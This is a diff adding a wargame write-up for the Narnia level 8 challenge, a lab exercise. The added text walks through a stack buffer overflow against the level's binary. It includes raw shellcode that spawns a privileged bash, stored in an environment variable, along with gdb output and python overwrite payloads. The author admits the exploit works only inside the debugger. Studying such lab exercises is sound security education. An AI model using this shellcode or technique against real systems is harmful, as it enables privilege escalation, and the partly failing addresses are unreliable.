@@ -552,4 +552,78 @@ From first glance, I notice that the program writes whatever we pass into the bo
 narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAA�����������
 ```
-Unfortunately, I could not solve this level :/
+I first ran the program with 20's which should overflow the buffer. Looking at the memory near $esp there are 3 important addresses:
+
+![Index html](/assets/images/narnia/08-2.png)
+
+0xffffd4bf -> blah pointer
+0xffffd278 -> ebp
+0x08049201 -> return address (main)
+
+Unfortunately, our buffer is too small to fit working shellcode, so the past approach of placing shellcode on the buffer and then overwriting the return address doesn't work. However, what we can do is store our shellcode in an environment variable, and then jump to the address of our environment variable instead! Finding the environment variable can be easily done with gdb. First, we will create the environment variable which will store our shellcode along with some NOPs. Note, we have to use command substition here since we can't store raw bytes otherwise:
+```bash
+narnia8@gibson:/narnia$ export SHELLCODE=$(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")
+```
+Next, use gdb and dereference our environ variable:
+```bash
+pwndbg> x/s *((char **)environ)
+0xffffd4d4:     "SHELL=/bin/bash"
+pwndbg> x/s *((char **)environ+1)
+0xffffd4e4:     "SHELLCODE=", '\220' <repeats 67 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
+```
+Since we only want the shellcode part, we will add 10 to our address to get rid of the "SHELLCODE=" part. Thus, our return address will be 0xffffd4ee:
+```bash
+pwndbg> x/s 0xffffd4e4+10
+0xffffd4ee:     '\220' <repeats 67 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
+```
+
+Unfortunately, we are not done. Simply using the following payload:
+```bash
+$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*20+b"\xbf\xd4\xff\xff"+b"\x78\xd2\xff\xff"+b"\xee\xd4\xff\xff")')
+```
+our program just exits normally:
+```bash
+pwndbg> c
+Continuing.
+[Inferior 1 (process 242287) exited normally]
+```
+If we inspect the memory area near $esp, notice our blah pointer has changed from 0xffffd4bf to 0xffff53bf:
+```bash
+pwndbg> x/20x $esp
+0xffffd24c:     0x0804a008      0xffffd254      0x41414141      0x41414141
+0xffffd25c:     0x41414141      0x41414141      0x41414141      0xffff53bf
+0xffffd26c:     0xffffd278      0x08049201      0xffffd4b3      0x00000000
+0xffffd27c:     0xf7da1cb9      0x00000002      0xffffd334      0xffffd340
+0xffffd28c:     0xffffd2a0      0xf7fade34      0x0804908d      0x00000002
+pwndbg> 
+```
+After experimenting, for every extra byte we pass in after 20 A's, the address of our blah pointer decreases by 1. Since we add 12 bytes, we need to subtract 12 from the original address of our blah pointer (0xffffd4bf), giving us 0xffffd4b3. This will be our final payload:
+```bash
+$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*20+b"\xb3\xd4\xff\xff"+b"\x78\xd2\xff\xff"+b"\xee\xd4\xff\xff")')
+```
+
+![Index html](/assets/images/narnia/08-3.png)
+
+We can see that it tried to execute a new program /usr/bin/bash which means it worked! Unfortunately, for some weird reason I could not get this to work outside gdb. I first tried to do the same thing by getting the original address of the blah pointer (0xffffd4fe), and subtracting 12 gives 0xffffd4f2:
+```bash
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAA | xxd
+00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+00000010: 4141 4141 fed4 ffff d8d2 ffff 0192 0408  AAAA............
+00000020: fed4 ffff 0a                             .....
+narnia8@gibson:/narnia$
+```
+
+However, the following payload does not work because I think the part I'm messing up is getting the address of our shellcode:
+```bash
+narnia8@gibson:/narnia$ ./narnia8 $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*20+b"\xf2\xd4\xff\xff"+b"\xd8\xd2\xff\xff"+b"\xee\xd4\xff\xff")')
+AAAAAAAAAAAAAAAAAAAA����������������
+Segmentation fault (core dumped)
+narnia8@gibson:/narnia$ 
+```
+
+I also tried changing the address of the shellcode to be somewhere near however I now get an illegal instruction error:
+```bash
+narnia8@gibson:/narnia$ ./narnia8 $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*20+b"\xf2\xd4\xff\xff"+b"\xd8\xd2\xff\xff"+b"\xfe\xd4\xff\xff")')
+AAAAAAAAAAAAAAAAAAAA����������������
+Illegal instruction (core dumped)
+```
